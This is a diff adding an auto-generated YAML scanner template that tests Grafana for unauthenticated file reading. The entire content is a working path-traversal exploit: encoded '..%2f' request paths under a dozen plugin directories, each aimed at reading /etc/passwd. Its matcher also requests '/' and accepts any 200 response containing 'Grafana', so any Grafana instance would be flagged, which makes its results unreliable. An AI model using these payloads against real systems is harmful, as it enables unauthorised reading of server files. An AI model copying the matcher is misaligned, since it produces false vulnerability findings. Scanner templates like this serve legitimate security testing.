@@ -1,0 +1,33 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-grafana-unauth_readfile
+info:
+  name: "Grafana unauth_readfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, grafana, ref-poc, readfile]
+  description: "由参考项目脚本静态导入：Grafana/unauth_readfile（类型 READFILE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/canvas/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "/public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Grafana"
+          - "root:x"
